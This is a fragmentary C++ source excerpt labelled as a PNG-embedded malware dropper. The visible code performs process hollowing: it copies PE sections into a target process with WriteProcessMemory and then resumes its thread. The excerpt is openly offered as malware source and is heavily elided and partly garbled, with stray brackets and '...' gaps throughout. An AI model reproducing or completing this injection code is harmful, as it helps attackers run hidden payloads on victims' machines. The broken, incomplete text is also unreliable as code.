// PNG-Embedded Malware Dropper - EXE Version
...
int main()
{
    ...
    // Execute the dropper functionality
    run();
...
)
{
    ...
    PIMAGE_SECTION_HEADER lpSectionHeader = 
        reinterpret_cast<PIMAGE_SECTION_HEADER>(
            reinterpret_cast<DWORD64>(lpNTHeader) + sizeof(IMAGE_NT_HEADERS)
        );
    for (int i = 0; i < lpNTHeader->FileHeader.NumberOfSections; i++)
    {
        if (!WriteProcessMemory(
            ...
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImageBase) + lpSectionHeader[i].VirtualAddress
            ),
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImage) + lpSectionHeader[i].PointerToRawData
            ),
            lpSectionHeader[i].SizeOfRawData,
            NULL
        ))
        {
            TerminateProcess(
    ...
    if (ResumeThread(lpPI->hThread) == ((DWORD)-1))
    {
        TerminateProcess(
            lpPI->hProcess,
            -9
